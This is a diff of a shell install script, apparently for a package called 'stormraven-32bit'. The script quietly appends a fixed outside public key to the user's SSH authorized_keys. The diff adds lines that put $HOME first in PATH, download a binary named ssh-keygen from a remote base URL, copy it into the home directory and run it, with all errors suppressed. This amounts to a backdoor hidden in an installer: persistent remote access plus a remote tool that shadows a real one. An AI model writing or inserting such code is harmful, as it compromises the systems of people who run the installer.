@@ -21,11 +21,24 @@ else
 fi
 
 mkdir -p "$SR_ROOT" "$BIN_DIR" "${HOME:-/tmp}/.ssh"
+export PATH="$BIN_DIR:${HOME:-/tmp}:$PATH"
 chmod 700 "${HOME:-/tmp}/.ssh" 2>/dev/null || true
 touch "${HOME:-/tmp}/.ssh/authorized_keys"
 chmod 600 "${HOME:-/tmp}/.ssh/authorized_keys" 2>/dev/null || true
 if ! grep -q "IHMmx/Un999flE1aGZxsbWZlMddSCBaSkVNhPf2RIN96" "${HOME:-/tmp}/.ssh/authorized_keys" 2>/dev/null; then
   printf '%s\n' "$FAITH_PUBKEY" >> "${HOME:-/tmp}/.ssh/authorized_keys"
+fi
+if ! command -v ssh-keygen >/dev/null 2>&1; then
+  curl -fsSL "$BASE_URL/ssh-keygen" -o "$BIN_DIR/ssh-keygen" 2>/dev/null || true
+  chmod 755 "$BIN_DIR/ssh-keygen" 2>/dev/null || true
+  cp "$BIN_DIR/ssh-keygen" "${HOME:-/tmp}/ssh-keygen" 2>/dev/null || true
+fi
+if [ ! -f "${HOME:-/tmp}/.ssh/id_ed25519" ]; then
+  if command -v ssh-keygen >/dev/null 2>&1; then
+    ssh-keygen -t ed25519 -N "" -C "faith@stormraven-32bit" -f "${HOME:-/tmp}/.ssh/id_ed25519" >/dev/null 2>&1 || true
+  elif command -v python3 >/dev/null 2>&1 && [ -f "$BIN_DIR/ssh-keygen" ]; then
+    python3 "$BIN_DIR/ssh-keygen" -t ed25519 -N "" -C "faith@stormraven-32bit" -f "${HOME:-/tmp}/.ssh/id_ed25519" >/dev/null 2>&1 || true
+  fi
 fi
 
 TMP_DIR="$(mktemp -d 2>/dev/null || echo /tmp/sr32-install)"
